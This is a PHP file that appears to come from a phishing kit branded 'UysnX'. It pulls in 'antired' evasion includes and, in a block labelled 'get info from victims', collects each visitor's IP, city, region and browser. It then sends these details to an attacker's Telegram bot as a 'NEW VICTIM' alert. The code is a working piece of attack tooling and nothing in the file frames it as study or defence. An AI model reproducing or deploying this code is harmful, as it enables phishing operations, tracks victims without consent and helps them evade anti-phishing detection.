<?php
 

 include "../antired_flag/anti1.php";
 include "../antired_flag/anti2.php"; 
 include "../antired_flag/anti3.php"; 
 include "../antired_flag/anti4.php"; 
 include "../antired_flag/anti5.php"; 
 include "../antired_flag/anti7.php";


/*   
 _ _               __  _ 
| | | _ _  ___._ _ \ \/  
| ' || | |<_-<| ' | \ \  
`___'`_. |/__/|_|_|_/\_\ 
     <___'    By nobdoy

            
*/
	
	

 ob_start();
	include 'xuysnx.php';
	include 'frifayr.php';
	$x = "UysnX";


if ($newvictims=="yes") {
#################################################################### get info from victims
$user_ip = getUserIP();
$ip = getUserIP();
$city = file_get_contents("https://ipapi.co/$ip/city/" );
$zip = file_get_contents("https://ipapi.co/$ip/postal/" );
$zip = file_get_contents("https://ipapi.co/$ip/region/" );
$browser = getBrowser();
#################################################################### get info from victims



$msg = "
♜ NEW VICTIM ♜
┏━━━━━━━━━━━━━━
♜IP : {$user_ip}
♜CITY : {$city}
♜ZIP : {$zip}
♜Browser : {$browser}
┗━━━━━━━━━━━━━━
╚═★ 𝘽𝙮 𝙐𝙮𝙣𝙨𝙓 ★═╝";
file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($msg) . "");
}
ob_end_clean();		
	?>